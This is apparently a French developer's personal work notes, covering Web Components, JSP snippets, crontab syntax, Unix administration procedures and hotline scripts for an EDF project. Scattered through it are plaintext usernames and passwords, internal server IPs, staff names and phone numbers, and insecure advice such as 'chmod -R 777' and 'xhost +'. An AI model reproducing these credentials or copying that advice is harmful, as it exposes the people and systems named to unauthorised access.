                                                        // attribute c'est : <totot CA="ça">ici c'est properties</totot>
                                              1)      static get observedAttributes()
                                                        {
                                                          return ['blabla','unattribut',...]; // voir ci dessous: LINK77738 NE pas utiliser "title" c'est un mot cle : boucle infinie
                                                        }
                                              3)        attributeChangedCallback(nameattr,oldval,newval) // exec chaque fois qu'un attrbt de observedAttributes change LINK77738
                                                        {
                                                          if (nameattr==='xxx') // mettre 3=
                                                          this[nameattr]=newval; // va appeler le setter de cette classe (uniquement pas le tag html) "set (lenomdemonattribut){}" et dedans implicitement j'aurais dans cette classe la propriete this.lenomdemonattribut... ATTENTION SUR LES onclick ca n'accepte pas des strings mais des fonctions
                                                        }
                                                        set unattribut(unevaleur){...  // les methodes get et set peuvent etre appellees entre classes javascript: databinding
                                                        this.setAttribute('unattribut',unevaleur); // modifie le dom associe à cette classe MAIS du coup immediatement DANS UN AUTRE THREAD appelle "attributeChangedCallback"
                                                        ...}               
                                                        get unattribut(){
                                                        return this.getAttribute('unattribut');
                                                        }
                                                        attachedCallback(){...}
                                                        disconnectedCallback() {...} //execute chaque fois que l'element est retire du DOM: pour par ex virer des event listeners...
                                                        mamethodperso() // a appeler imperativement comme ça this.mamethodeperso(); // si this c'est pas ma classe je peux hors du scope faire varmaclasse=this puis appeler ma methodeperso: maclasse=mamethodeperso (LINKautredatabiding)
                                                        {....
                                                            var timer=setInterval(this.uneautremethodepersodecetteclasse.bind(this), 7000); // bind pour que dans le setInterval, this corresponde à cette classe et non pas à window
                                                        }
                                                        this.dispatchEvent(new CustomEvent('unNomQueJ'invente',{unobjetJSON}); // envoie un event vers l'univers!
                                                        this.addEventListener('unNomQueJ'invente',function(e){        // reception d'un event depuis l'univers (dans cet exemple il s'envoie a lui meme car même nomQueJinvente: n'a pas de sens mais c pour l'exemple)
                                                                        this.toto=e.detail.unparametreARecuperer;
                                                                        this.titi=e.detail.unAutreParametreARecuperer;
                                                                         this.parentElement.openclose(); // pour appeller une methode de l'element qui entoure englobe cette classe (pas l'heritage mais au niveau html)
                                                                    }.bind(this) // possible de faire ca si this n'est plus ma classe mais un slot ou quoi... comme ça dans la fonction ci dessus this sera mon custom element.
                                                    }
                                                 }
                                                Puis
                                                var montag =window.customElements.define('laurent-moncompoentn1', MonElement); //du coup chaque fois qu'il verra <laurent-moncopoentn1> il creera une instance de la classe MonElement
                                                 //instancier mon tag :<laurent-moncompoentn1></laurent-moncompoentn1> // toujours mettre "-"
                                                 //ou en js : faire var toto = document.createElement('laurent-moncompoentn1'); ou var toto = new montag(); 
                                                 //     puis document.body.appendChild(toto);

        appeller une methode d'un custom element depuis l'exterieur : 
                    var toto = document.querySelector("memoclap-alertmessage");
                      toto.maMethode();
                    ou 
                    var titi = new MonCustomElement();
                    titi.maMethode();
          
       
    customCompoents : METHODE PROTOTYPE VOUE A DISPARAITRE?
    (function(window, document, undefined) {
    var thatDoc = document; // Refers to the "importer", which is index.html
    var thisDoc =  (thatDoc._currentScript || thatDoc.currentScript).ownerDocument; // Refers to the "importee", which is src/hello-world.html
    var template = thisDoc.querySelector('template').content;// Gets content from <template>
    var MyElementProto = Object.create(HTMLElement.prototype);// Creates an object based in the HTML Element prototype
    MyElementProto.unparametre='blabla'; MyElementProto.unautreparametre; MyElementProto.tutu=function(){blabla this.tata}; //optionnel
    MyElementProto.createdCallback = function()
    {
        var shadowRoot = this.createShadowRoot();// V0: obsolete. Creates the shadow root // attention n'est pas supporte sur tous les navigateurs: prevoir un mode degrade
        var clone = thatDoc.importNode(template, true);// Adds a template clone into shadow root
        shadowRoot.appendChild(clone);
        this.image = shadowRoot.querySelector('img');
        if (this.hasAttribute('who')) // va chercher dans le dom
        {
            var who = this.getAttribute('who');// va chercher dans le dom
            this.setWho(who);
        }
      };
    MyElementProto.attributeChangedCallback = function(attr, oldVal, newVal) (attention voir observedAttributes) 
    { // Fires when an attribute was added, removed, or updated
        if (attr === 'who') {
            this.setWho(newVal);
        }
    };
    MyElementProto.setWho = function(val) 
    {
        this.url.href=val;
    };
    // Registers <hello-world> in the main document
    try{                                                                                                                                                                                                       
          window.customElements.define("share-button", MyElementProto, { extends: "html" }); ca c la v1
          window.MyElement = thatDoc.registerElement('share-button', {prototype: MyElementProto}); // ca c la v0
    })(window, document);
    </script>
            
            
JSP :                      
      ${pageContext.request.contextPath}
pour afficher les erreurs dans la page d'erreur jsp:
                                  <%@ page import="java.lang.Exception"%>
                                  <%@ page import="java.io.PrintWriter"%>
                                  Error occured. Stacktrace below:
                                  <br>
                                  <br>
                                  
                                  <%
                                  if ((Exception)request.getAttribute("javax.servlet.error.exception") != null) {
                                  	
                                      out.println(((Exception)request.getAttribute("javax.servlet.error.exception")).getMessage());
                                  }
                                  %>
                                  <br>
                                  <br>
                                  Cause :
                                  <br>
                                  <br>
                                  <%
                                  if ((Exception)request.getAttribute("javax.servlet.error.exception") != null) {
                                  	 ((Exception)request.getAttribute("javax.servlet.error.exception")).printStackTrace(new java.io.PrintWriter(out));
                                  } %> 
pour simuler un click sur un bouton parcourir ou un autre element : 
        function openParcourir()
        {
          //document.getElementById("files").click();
        	//var evObj = document.createEvent('Events');
        	//evObj.initEvent("click", true, false);
        	//document.getElementById("files").dispatchEvent(evObj);
        	//document.getElementById('files').fireEvent('onclick');
        }
        plus generalement on peut utiliser cette methode : 
        function eventFire(el, etype)
        {
                if (el.fireEvent) {
                  (el.fireEvent('on' + etype));
                } else {
                  var evObj = document.createEvent('Events');
                  evObj.initEvent(etype, true, false);
                  el.dispatchEvent(evObj);
                }
              }
pour pouvoir saisir quelquechose dans le bouton parcourir...: 
			faire en javascript: 
			function validate(){
				try{
					document.filesUploadForm.submit();
				} catch(err) { 		
			   		document.filesUploadForm.reset();
			   		document.filesUploadForm.submit();
				}
			}
			<html:form action="/UploadAnomaliesFile.do" method="post" enctype="multipart/form-data" >
			(...) 						<input type="file" name="file" id="filesUploadForm" size="70" class="RnoButton" />		
			(...)
			<layout:link href="javascript:validate();" styleClass="RnoButton"> ou plutot : <layout:link href="#" onclick="javascript:window.open('ArcaPaged.do');" styleClass="RnoButton">
										<bean:message key="SYS_VALID"/>
									</layout:link>
									<layout:link href="javascript:document.filesUploadForm.reset();" styleClass="RnoButton">
										<bean:message key="01020"/>
									</layout:link>
				</html:form>
			
Si on ne veut pas que bean:write interprette le html il faut mettre: filter = false
Java bean: pour creer des instances d'objets java avec jsp:
on peut alors lui definir des attributs et les recuperer:

<!-- pour desactiver les cellules ne pas utiliser disabled dans les input type = text mais mettre: 
							                    		onblur="formatInputValue('<%= ((rc9.restitution.documents.datas.IndicateurDecorator)indicateur).getFormatDonnee() %>', 'saisie[<%= String.valueOf(indexSaisie) %>].strValeur'); document.forms[0].elements['saisie[<%= String.valueOf(indexSaisie) %>].strValeur'].value='<%= ((rc9.restitution.documents.datas.IndicateurDecorator)indicateur).getValeur( ((rc9.bean.PeriodBean)period).getDateStart(), ((Integer)typeSaisie).intValue()) %>'" 
-->                                         blur c comme loosefocus

pour recuperer des variables java dans des jsp:
        <html:select name="item" property="defauval">
				    <option value =""></option>
					<logic:iterate name="item" id = "itemChild" property="childSimpleInf" scope="request"> scope="request" facultatif
					<jsp:useBean id="champ"  scope="request" class="renault.wec.dmd.backend.dao.SimpleInf"/> // attention champ est le nom de l'objet sette dans le request et aussi le nom utilise par la suite dans la jsp
					<jsp:useBean id="option" scope="request"  class="java.lang.String"/> // attention option est le nom de l'objet sette dans le request et aussi le nom utilise par la suite dans la jsp
					<%int i=0;%>
 	        <jsp:useBean id="arrayDynCmpDmd"  scope="session" class="java.util.Vector" />
					  // idemn (ici comme c un vecteur: oblige d'iterer avec un int... oui c tres moche)
					       Puis possible faire:<%=I18NManager.get("DESCR_"+((renault.wec.dmd.backend.dao.SimpleInf)arrayDynCmpDmd.get(i)).getNom(), I18NService.getSessionLangue(request)) %>
					       ou <%=I18NManager.get(ficheForm.getEnv(), I18NService.getSessionLangue(request)) %> je peux remplacer un <bean:write name="ficheForm" property="env"/> par ca ! hehe
					<option value="<bean:write name="itemChild" />" <% if (champ.getDefauval().equals(option)){%>selected="selected" <%}%>><bean:write name="itemChild"/></option>
					<%=((renault.wec.dmd.backend.dao.SimpleInf)arrayDynCmpDmd.get(i)).getNom()%>
        <%i++;%>
      </logic:iterate>					
autre facon de faire un select : le plus adaptable possible je pense: (avec preselection) 
		    			<% renault.wec.fou.form.FouIPNForm  formulaire = (renault.wec.fou.form.FouIPNForm)request.getAttribute("fouIPNForm"); %>
	        			<% java.util.Vector  liste = (java.util.Vector)request.getSession(false).getAttribute("arrayAllRol"); %>
				<html:select property="group" size="1" onchange="javascript: loadGroupData(this)">
	        		<option value=''><%=I18NManager.get("01175",I18NService.getSessionLangue(request))%></option>
	        	<%    	for (int i = 0; i<liste.size();i++)
	        			{
	        				renault.wec.dmd.backend.dao.UsrRolInfo item = (renault.wec.dmd.backend.dao.UsrRolInfo)liste.get(i); %>
			        		<option value="<%=item.getUsr()%>¤<%=item.getCn()%>" <% if (formulaire.getGroup().equals(item.getRol())){ %> selected="selected"<%}%>><%=item.getRol()%></option>
					<%}%>							
	        	</html:select>


BeanTest.jsp:
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
...
<BODY>
...
<jsp:useBean id="test" class="hall.SimpleBean" scope="page"/> scope peut etre egal à  : page, request, session, ou application // attention test est le nom de l'objet sette dans le request et aussi le nom utilise par la suite dans la jsp
permet ensuite de faire des <% if (test...) voir "pour recuperer des variables java dans des jsp"
<jsp:setProperty name="test" 
                 property="message" 
                 value="Hello WWW" />
( ou bien: 
<jsp:setProperty name="orderBean"
                 property="numberOfItems"
                 param="numItems" />
correspond à  value = request.getParameter("numItems")
)
             
<H1>Message: <I>
<jsp:getProperty name="test" property="message" />
</I></H1>
             
</BODY>^
</HTML>

SimpleBean.java:

public class SimpleBean {
  private String message = "No message specified";

  public String getMessage() {
    return(message);
  }

  public void setMessage(String message) {
    this.message = message;
  }
}

jsp: pour que le request soit transfere a une autre page:
      <jsp:forward page="/utils/errorReporter.jsp" /> (en dur)
      ou bien
      <jsp:forward page="<%= someJavaExpression %>" />



code internet mounji edf: ismehen


developpez.com:
user: foulure
pass: calotte

cindy
http://cindy.services-publics.capgemini.fr/
capmail: 
http://capmail.capgemini.fr/cgi-auth/auth.pl

crontab : shell unix: 
      si la crontab ne marche pas peut etre que c parce que les scrits n'ont pas les droits d'execution x sous UNIX
      crontab -l pour afficher la liste des taches de la crontab
      crontab nomdefichier (ou nomdefichier contient les commandes crontab) pour charger directement ce fichier dans la programmation crontab
      crontab -e pour l'editer
      si ca ne marche pas : on arrive pas a ecrire et il repond "?" il faut changer d'editeur par defaut: 
      pour quitter: q
      puis: 
      EDITOR=/usr/bin/vi
      export EDITOR
      and you really want to put it in your startup file for your shell so it will be set each time you login.
      crontab -e:
      mm hh jj MMM JJJ tâche >(ou >>) abs/path/vers/log/mon.log // si il n'arrive pas à ecrire dans le fichier log le crontab ne se lance pas
      mm represente les minutes (de 0 à 59) 
      hh represente l'heure (de 0 à 23) 
      jj represente le numero du jour du mois (de 1 à 31) 
      MMM represente le numero du mois (de 1 à 12) ou l'abreviation du nom du mois (jan, feb, mar, apr, ...) 
      JJJ represente l'abreviation du nom du jour ou le chiffre correspondant au jour de la semaine (0 represente le dimanche, 1 represente le lundi, ...) 
      tâche represente la commande ou le script shell à executer 
      log represente le nom d'un fichier dans lequel stocker le journal des operations. 
      ATTENTION Si la clause> log n'est pas specifiee, cron enverra automatiquement un courriel de confirmation.
      Pour eviter cela il suffit de specifier > /dev/null 
      Pour chaque unite de temps (minute/heure/...) les notations sont possibles:
      
      * : a chaque unite de temps 
      2-5 : les unites de temps (2,3,4,5) 
      */3 : toutes les 3 unites de temps (0,3,6,...) exemple: toutes les 5 minutes */5 * * * * 
      5,8 : les unites de temps 5 et 8 
      Si sur la même ligne on trouve precisees une unite de temps "numero du jour du mois" et une unite de temps "jour de la semaine", celles-ci sont considerees par crontab comme cumulatives.
      exemple:
      Tous les jours à 23h30: 
      30 23 * * * df >>/tmp/log_df.txt
      autres exemples pour lancer ecpi tous les jours:
      00 03 * * 1,2,3,4,5 /cpidev01/cpi/cmd/cpiAutoAcciones
      * * * * 1-5 /r08int01/r08/vcour/r08Bat/gdvTCRBatchExportFile.sh >> /r08int01/r08/vcour/r08Bat/toto.txt (// si chemin incorrect crontab ne se lance pas)
      00 08 * * * /cpidev01/cpi/ira/StartStopAs_wac01AS_cpi.ksh start
      ATTENTION dans le SH si c pour utiliser du java bien mettre des chemins absolus avec des export de variable reutilisees avec $MONPATH.
      Si log4j, voir plus haut(-D) 
    si avec crontab j'ai le message sudo: sorry, you must have a tty to run sudo 
          essayer dans ma commande crontab de faire 05 17 * * 1 `exec bash; /applis/wecre701/wec/ira/Start* stop` >> /applis/wecre701/wec/logs/cronrestart.log (attention la guilement c la touche altgr7)      


galaxy: login/mot de passe: lduverge / odIjs238e
odIjs238e
odIjs238e

http://wtr.capgemini.fr/
puis
C:\wtr\frameWork\frameWork.html
ATTENTION, les jours feriers ne sont pas comptabilises!
login: duverge
code: 00413601
00413601
00413601
00413601
SECRETAIRE DE LA WTR: 0149674103 (anne marie)
mon code sur eol : U11DO3. mon skill: IBS
code pour les formations exterieures: up3xf* * pour la recherche

calculette jean baptiste: login jsaillof 
calculette kamoun: loggin: MKAMMOUN code calculette 8323 ne pas mettre le tiret dans le mot de passe
calculette lduverge: loggin: lduverge code calculette 2728ne pas mettre le tiret dans le mot de passe
wtr
UP3XCP635 - Conge paye 693T04 TS PS F635 UP3XCP635 1  35.00    1                                 1               
UP3XRTE93  - RTE Employe 693T04 TS PS F635
U11D03635 - ADC MAINTENANCE693635
R30E09635 - EDF - M.C.O. (suite U11D03)
UP3XADS93	Congâ€š Dâ€šcÅ s 693T04 TS PS F635
UP3XADT93	Congâ€š Dâ€šmâ€šnag 693T04 TS PS635
UP3XAM635	Congâ€š Mariage 693T04 TS PS635
UP3XAN635	Congâ€š Naissance 693T04 TS P635
Conges non payes 
UP3XPAT93	Congâ€š Paternitâ€š 693T04 TS P635
UP3XCN635	Congâ€š non payâ€š 693T04 TS PS635
Conges payes 
UP3XCP635	Congâ€š payâ€š 693T04 TS PS F635
Formation 
UP3XFO493	Form.Dispensâ€še 693T04 TS PS635
UP3XFO393	Format. Externe 693T04 TS P635
UP3XFO293	Format. Groupe 693T04 TS PS635
UP3XFO593	Format.s/projet 693T04 TS P635
UP3XFO193	Formation CFP 693T04 TS PS635
Intercontrat 
UP3XAT635	Intercontrat 693T04 TS PS F635
Jours de recuperation 
UP3XRTE93	RTE Employâ€š 693T04 TS PS F635
UP3XRTT93	RTT Employeur 693T04 TS PS635
UP3XRTR93	RTT Report 2002 693T04 TS P635
UP3XHR635	Râ€šcup H.Excâ€šd 693T04 TS PS635
Maladie 
UP3XMAL93	Maladie 693T04 TS PS F635
UP3XMAT93	Maternitâ€š 693T04 TS PS F635
Travaux internes 
UP3XTRY93	Travaux intern 693T04 TS PS635
Delegation :  UP3XDL635

(avant: projet facturable > recherche: U03d05: valider...)
projet facturable SC ADI hors PM  ADS U23D01 dict2002 + am
projet flash: u23d03665 dict cd rom

serveur vocal:
a partir du poste 7658
13: repasser en mode original (sans serveur vocal) sur le poste 7400
12: passer en mode serveur vocal

Le poste 7400 = 7855(numero virtuel)
Hot-line Discofone
01 44 83 10 20 
M. Barroit a installe l'application
barroit@discofone.fr
-Annonce d'acceuil
02050 Bienvenue sur la Hotline DICTplus, veuillez patienter votre appel va automatiquement etre transfere au support technique

Bienvenue sur la Hotline DICTplus, afin de faciliter le traitement de votre appel,  veuillez nous indiquer son origine: 
Vous etes exploitant EDF GDF, composez le 1, vous etes declarant, composez le 2 si vous appellez à  partir d'un telephone numeris,
 veuillez patienter votre appel va automatiquement etre transfere au support technique

laurent courtois: 8071
09405 numeris

-Annonce de repondeur enregistreur HL ferme (07h-10h;12h-14h; 16h-19h)
Notre service est actuellement ferme. Nos horaires d'ouverture sont de 10h00 à  12h00 et de 14h00 à  16h00 du Lundi au Vendredi. Vous pouvez toutefois nous laisser un message en parlant après le bip sonore.

-Annonce de repondeur simple (19h00-07h00)
Bienvenue sur la Hotline DICT Plus. Notre service est actuellement ferme. Nos horaires d'ouverture sont de 10h00 à  12h00 et de 14h00 à  16h00 du Lundi au Vendredi.

-Annonce de dissuasion
Tous nos operateurs sont actuellement occupes et nous sommes dans l'impossiblilite de repondre à  votre appel, vous pouvez toutefois nous laisser un message. Vous serez redirige vers le repondeur dans quelques secondes

-Annonce d'attente 1 diffusee une seule fois
Tous nos operateurs sont actuellement en ligne, veuillez nous excuser pour cette attente.

-Annonce d'attente 2 diffusee en boucle 
Tous nos operateurs sont actuellement en ligne. Si vous le desirez, vous pouvez nous laisser un message: pour cela, veuillez taper sur la touche dièse de votre telephone. + musique de fond

09900 -Annonce de fermeture exeptionnelle
Bienvenue sur la hotline DICTPlus. L'application DICTPlus (est momentanèment indisponible)(,presente une anomalie 
sur certaines actions de validation,) notre equipe technique est
en cours d'intervention afin de retablir le service. Nous vous prions de bien vouloir nous excuser (cet arrêt momentalnee)
ce disfonctionnement et vous invitons à  vous reconnecter plus tard. Si votre appel ne concerne pas l'incident en cours, 
vous pouvez laisser un message, le support techique vous recontactera

Bienvenue sur la hotline DICTPlus. L'application DICTPlus est momentanèment indisponible notre equipe technique est
en cours d'intervention afin de retablir le service. Nous vous prions de bien vouloir nous excuser 
ce disfonctionnement et vous invitons à  vous reconnecter plus tard. Si votre appel ne concerne pas l'incident en cours, 
vous pouvez laisser un message, le support techique vous recontactera

enregistrer l'annonce de fermeture exeptionelle:

999#
code: 123123
3: effacer puis #
31: reenregistrer
1: enregistrer à  la suite
#: confirmer
8: reecouter

sur msdos, si le fichier temp est trop gros avec tous ses fichiers caches: aller sur ms dos et tapper: c:t d'acceder aux listes d'attente des deux serveurs Report de Production (passer par le proxy) : 
http://195.101.127.71/cgi-bin/reports.cgi/showjobs?server=repserv_EDF2DIKT_fepapp1
http://195.101.127.71/cgi-bin/reports.cgi/showjobs?server=repserv_EDF2DIKT_fepapp2
Ilny a aussi des URLs permettant d'acceder aux paramètres des serveurs Report de Production : 
http://195.101.127.71/cgi-bin/reports.cgi/showenv?server=repserv_EDF2DIKT_fepapp1 
http://195.101.127.71/cgi-bin/reports.cgi/showenv?server=repserv_EDF2DIKT_fepapp2 

Autre moyen plus rapide (par internet: )
https://195.101.127.153/cgi-bin/reports.cgi/showenv?server=repserv_EDF2DIKT_fepapp2 
et pour la preprod:
https://195.101.127.153/cgi-bin/reports.cgi/showjobs?server=REPSERV_EDF2DIKT

native:
PARFOIS IL FAUT DEFINIR DES LIBRAIRIES SUR LA MACHINE VIRTUELLE JAVA: dans: D:\Program Files\jdk1.2.2\jre\lib\security\java.security (par ex) il a fallu rajoutter la ligne: security.provider.2=com.sun.crypto.provider.SunJCE

relancer serveur en preprod: RELANCER http://194.51.14.252 user: bgr.EDF2 password: bgr menu webs dynamiques > MAJ preprod > bouton produire des applications. Ensuite verifier sur dictwas de dataprod si le lancement a bien ete effectue

LP59 086 : document complement sur connexion internet: envoi de fax maintenu pour les declarants utilisant le kiosque. Pour les declarants utilisant internet: uniquement envoi par courrier et système informatique


chmod -R 755
read r 4
write w 2
Execute x 1
u proprietaire (user)
g groupe (group)
o les autres (other)
a tous (all)
chmod -R a+r *
chmod -R a+r nomrep


chown [-R] utilisateur fichierOuRepertoire (-R pour recursif)
chown [-R] utilisateur:groupe fichierOuRepertoire (-R pour recursif)

graceland: 0223284158

instructions fonctionnelles: lot8: ic24...

LP59083: instructions fonctionelles evolutions pour securisation internet

Si je n'arrive plus a me connecter ni sur dict P: ou/ni sur Stauzied M: allez dans panneau de configuration > Reseau > protocole > TCP/IP > propriete adresse IP: faire appliquer adresse IP en dur puis revenir sur automatique, se deconnecter et se reconnecter.
si je veux me connecter en dur sur miami: aller dans panneau de configuration > Reseau > protocole > TCP/IP > propriete adresse IP: 10.68.81.253 ou 242 masque: 255.255.255.0 Valider et redemarrer l'ordinateur.

si sur exell il me marque toujours #VALEUR! verifier qu'il n'y a pas d'espace dans les cases que j'ai selectionne pour faire mon calcul.

Mode degrade: 4 jours apres avoir recu (code_operation = 32: impression, saisi reponse...) une dict systeme, si on ne la traite pas, on la recoi par fax
Mode degrade: 4 jours d'exploitant vers declarant. parametrable par m clos pour edf

installer sur windows xp: paneau de config: ... > connection reseau entreprise > conextion a distance rnis standard ou rnis >nom tel >mon utilisation uniquement

/usr/local/bin/jpegtran -copy none plan_acces.jpg > plan2.jpgcd
Pour l'aide :
/usr/local/bin/jpegtran -help
La procedure à  suivre lorsqu'un utilisateur signale un incident de
generation avec un plan joint :
- se faire envoyer le plan joint posant problème par mail ou prendre les
references et aller recuperer le plan joint par ftp dans le repertoire
/data_prod/data/plans/
- utiliser jpegtran pour convertir le fichier jpeg
- tester en environnement local si le fichier resultat est bien gere par Report.
Merci de conserver les plans d'origine, et de tracer l'ensemble des tests
effectues.

Gerer les envois par mail des rapports de fax: dataprod/batch/config


Il est desormais possible de visualiser les log WS en prod et preprod (1000
dernieres lignes) .

via les sites http de preprod
http://195.101.127.121/cgi-bin/stderr_preprod 
http://195.101.127.121/cgi-bin/stdout_preprod 
http://195.101.127.121 (l'appli)


En passant par le proxy, 
Les 3 urls suivantes recupèrent les logs applicatifs en ne ramenant qu'une centaine de lignes. 
http://195.101.127.121/cgi-bin/dictwaslog_prod 
http://195.101.127.121/cgi-bin/dictwaslog_preprod 
http://195.101.127.121/cgi-bin/cntsession_prod


Le logiciel report est sur le CD Oracle pour installation
SUPPRIME EXPRES 
FTP:
DICT extranet.dev.dict... etc.
App
pour la prod: liens virtuel utiliser l'autre ftp: fed c'est les logs de production

WSFTP pour exporter en preprod via ftp.

pour ajouter un package au projet java, selectionner le projet, cliquer sur l'icone avec un plus au dessus du dessin PROJET et ajouter le package correspondant.

pour exporter de la preprod vers la prod, aller sur ADMIN FTT ou http://194.51.14.252 user: bgr.EDF2 password: bgr; Puis sur web dinamiques> mise en production> attention la premiere option sert a tout exporter!!! cliquer sur GESTION DES PROJETS DEPLOIEMENT aller dans apps, wasadv EDF2DICT, servlet selectionner tous les fichiers 'normaux'. faire pareil dans le repertoire 'html' puis cliquer sur le bouton "activer" quand le transfert est fait, dictpluswas.log est ecrase donc tout petit: le lire... En cliquant sur le bouton "modifier" on verifie que tout a bien ete exporte.
pour lancer des requettes d'updates sur la prod ou la preprod, faire comme c'est explique au dessus pour le tableau de bord. sur ftp: dictwebsphere. SGBD/ORACLE/DATA  EN MODE ASCII!!!

Cleanfax et cleanfaxback: quand on lance ces requettes pour reinitialiser tous les dossiers et tout "bloquer", il y a toujours un ptit message d'erreur dans le log sql a la fin... ne pas en tenir compte.

pour moi
Internet / extranet: configurer explorer: option internet > connexion > pararmetre lan > proxy oui ou non

winCVS: pour que ca comment automatiquement ce que j'ai fait:  .java $LOG: $ si c'est un fichier java. .html $LOG: $ si c'est un fichier html

Fax n'arrivent pas si bourrage papier, ou fax eteind etc..... c pas toujours faute a DICTplus

si creation d'un nouveau fichier .java .html ou .js: lors de la mise sous le poisson: je dois rentrer le code log particulier
:
select substr(exp_nom,1,3) from recepisse where rownum <5 pour recuperer seulement les trois premiers caracteres du champ. utilisation de substr

utilisation de instr et de substr:
select substr(U.chemin_repair, 1, instr(U.chemin_repair, '/')-1) from t_ui U



Homesite :
faire une recherche comme ca : to AND NOT toto. faire to[^to]

Le numero de la hotline est sur le mur

les evolutions a effectuer sont sur IC24 252 V1.1

le suivi des evolutions est sur IC24 256 

Mes erreurs:

win cvs: quand je cree un nouveau dossier en local sur stauzied, ne pas recopier les .cvs!!!!! de plus quand je fais l'import d'un dossier qui contient des ficher: importer d'abord le dossier puis les fichiers. c'est cvs qui me cree les sous repertoies .REPOSITORY etc...

Nouveau tableau de bord: ne pas depasser les semaines: travail inutile et redondance: retour a l'annee n-1

importer les graphs exell sur word au format image. sinon ca prends trop de place

rajoutter des fichiers sur dictplus avec addoc

HOTLINE/
mettre des accents dans le fichier hotline!
ne plus parler de QNC.exe! http://site.ifrance.com/groupware/hotline/admin.htm
Quand j'enregistre de nouveaux appels, ne pas filtrer: sinon doublons des LD
rester sobre dans la redaction des fichiers hotline
Nestscape ne gere pas l'impression des statistiques regionales.. inutile de le mettre sur les fichiers hotline
POUR L'installation de DICTPLUS: ne pas toucher aux parametres LAN!!!!!!
le fichier hotline general est sur IC28033

COMITE HOTLINE: regarder 'compte rendu du pilotage hotline': IC24263 ecrire dessus projet en diagonale (?).
Regarder si le precedent a ete approuve: voir le classeur: "delivrable contracuel" premier intercalaire. Au debut de la reunion, fixer la date de la prochaine reunion
passer au doc fichier Hotline general sur IC28033: sur ce doc: le moins de 'en cours' possible, bien comprendre evol ano,
 tout doit etre clair.
Passer au document IC28017: evol ano transmi par ADM NAT mais pas traite par ADM SYS: lire avant commite et y mettre de commentaires
 pour moi avant et pdt commite, ecrire sur ce doc les reponses oui: comment, non: pourquoi.
Dans le precedent, enlever tout ce qui est FERME EVOLUTION ET A CORRIGER. Y mettre les etats suivants: A FERMER; A CORRIGER; A L ETUDE (j'y reflechirais); EN ATTENTE 
( de + de demandes); ACCEPTE
partie 'transmi/mail': avant commite: enlever tout ce qui est clà´ture. après commite: ajouter les demandes remises par clos et chochoy

Si j'ai eteind ordi, et je n'ai plus acces au reseau: deconnecter et reconnecter.

Si j'ai tout reimporte du poisson et que je n'arrive plus a aller sous 6300: aller dans: dev/dict/javascript/servlet.js
et ecrire ca:
// Fonction retournant le debut du path de la servet à  utilise.
function funServletPath(){
 return "/EDF2/classes_st/";
}
depuis JRN c'est : return "/servlet/";

si les logs ne marchent pas, si besoin changer les droits d'un fichier: 
faire executer telnet_miami puis su root puis chmod -R 777 pour me donner tous les droits recursivement

si il y a toujours une erreur applicative sur mon compte meme apres avoir tout reimporte du poisson. verifier si tous les .cfg des repertoires dev/dict/classes et dev/dict/sources sont identiques.

sous websphere, les objets serialisables ne marchent pas bien sur deux serveurs... ( ?!)

du code java pour aller sur une autre page sans rien faire de special
res.setContentType("text/html");
res.setHeader("pragma", "no-cache");
ServletOutputStream out = res.getOutputStream();
TemplateContext context = new ProxyBundle();
context.setOutputStream(out);
getPage("html.docIntrouvable").print(context);
out.close();


procedure protocole d'envoi des mails de statistiques: 
1- copier les colonnes A, B, C, D, E des feuilles GDF/EDF du fichier joint dans un fichier nomme donneesCentres.txt en commenà§ant par les stats de GDF. En semaine, mettre 10 centres et 50 le vendredi. 
2- copier ce fichier par ftp dans le repertoire /data_prod/batch/config avant 19h00 (heure de lancement quotidien du batch). 
3- les resultats des traitements se trouvent dans des fichiers de log mail_date_1900.log.
(Le parametrage des dates periodes des stats et le titre du mail que vont recevoir les exploitants se fait sur data_prod/batch/config/batch.cfg: à  mettre a jour chaque debut de mois)


Un incident OAS s'est produit la semaine dernière. Une cartouche OAS
refusait de s'eteindre. Le fonctionnement d'OAS devenait erratique.
Voici pour info les actions realisees pour retablir le service.
1) arrêt-relance d'OAS à  partir du script d'arrêt-relance de l'ensemble des
services Miami (OAS, Netscape, Oracle, Report).
- se connecter sous root
$ dict stop
$ dict start
Resultat : Sans effet.
2) Reboot du serveur miami
- Arrêt prealable des services Miami à  l'aide du script dict.
$ shutdown -y -i 6
$ dict start
Resultat : Sans effet.
3) Modification des fichiers de paramètrages d'OAS :
- se connecter sous oas/oas
- Arrêt d'OAS manuel :
$ owsctl stop (arrêt cartouches et services OAS)
$ owsctl stop -nodemgr (arrêt du node manager)
- utilisation de precedentes versions de fichiers de conf OAS :
$ cp site.app site.app.save
$ cp wrb.app wrb.app.save
$ cp site.app.9 site.app.save
$ cp wrb.app.9 wrb.app
- Redemarrage OAS
$ owsctl start -nodemgr
$ owsctl start
Resultat : Fonctionnement correct.


restauration des sauvegardes:
Une sauvegarde de miami est effectuee à  intervalle regulier sur cassette.
Voici la procedure à  suivre pour restaurer des fichiers/repertoires:
- se connecter sous son compte habituel.
- lancement de ufsrestore en mode interactif :
$ /usr/sbin/ufsrestore i
Une fois ufsrestore lance avec l'option i, un prompt "ufsrestore>" est
propose, et permet ensuite d'utiliser les commandes internes suivantes :
- ls [repertoire] : liste des fichiers sauvegardes dans le repertoire
specifie ou le repertoire courant
- cd repertoire : change de repertoire courant
- pwd : affiche le nom du repertoire courant
- add [nom de fichier] : ajoute les fichiers et/ou repertoires specifies à 
la liste des fichiers à  restaurer
- delete [nom de fichier] : supprimer les fichiers et/ou repertoires
specifies de la liste des fichiers à  restaurer
- extract : provoque la restauration de tous les fichiers specifies
precedement à  l'aide de la commande add
- help : affiche un resume des commandes
- quit : termine l'execution de ufsrestore sans rien restaurer
voici un exemple pour recuperer un fichier load.js
$> /usr/sbin/ufsrestore i
ufsretore> pwd
/
ufsretore> cd /users/sduteis/dict/html/adm/load
ufsretore> add load.js
ufsretore> extract
you have not read any volumes yet. Unless you know which volume your file(s)
are on you should start with the last volume and work towards the first.
Specify next volume # : 1 #
la restauration peut
prendre pas mal de temps
set owner/mode for '.' ? [yn] n 
ufsretore>quit
Attention :
- l'extraction prend en compte vos droits d'user pour la restauration.
- les fichiers sont restaures (path compris) dans le repertoire courant au
moment de l'execution d'ufsrestore.

cgt
Christian LEGENDRE 0149018824 clegendr@capgemini.fr

IMAGES GENEREES EN JAVA SUR UNIX:
Question:
Why is the following error message displayed "java.lang.InternalError: Can't connect to X11 window server using ':0.0' as the value of the DISPLAY variable" ?
Answer:
The error is related to the xhost on Unix-shell based systems. The xhost program is used to add or revert access to the X server for specified hosts. Set a display variable and issue the following command on the system:
setenv DISPLAY :0
/usr/openwin/bin/xhost + 
or simply: 
"xhost +" 
